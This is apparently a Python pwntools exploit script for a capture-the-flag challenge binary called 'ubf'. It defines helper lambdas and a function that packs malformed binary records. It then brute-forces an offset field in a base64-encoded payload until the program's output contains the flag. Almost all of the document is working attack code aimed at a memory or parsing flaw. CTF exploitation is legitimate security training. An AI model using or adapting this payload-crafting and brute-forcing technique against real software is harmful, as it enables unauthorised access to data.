#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1
filename = "./ubf"
if LOCAL:
    # io = process(filename)
    pass
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
u32_ex = lambda data : u32(data.ljust(4, b'\x00'))
u64_ex = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

def generate_payload(size, choice, x1, x2, data):
    payload  = p32(size)
    payload += choice
    payload += p16(x1)
    payload += p16(x2)
    payload += data
    return payload

for i in range(0x10, 0x10000):
    try:
        io = process(filename)
        payload = generate_payload(5, b's', 1, 2, p16(5) + b"$FLAG")
        payload+= generate_payload(0x100, b'b', 1, 0x10000 - (i), b"\x01")
        ru(b'Enter UBF data base64 encoded:\n')
        sl(base64.b64encode(payload))
        lg("i")
        res = io.recv()
        assert b"flag" in res
        print(res)
        input()
    except Exception as e:
        io.close()
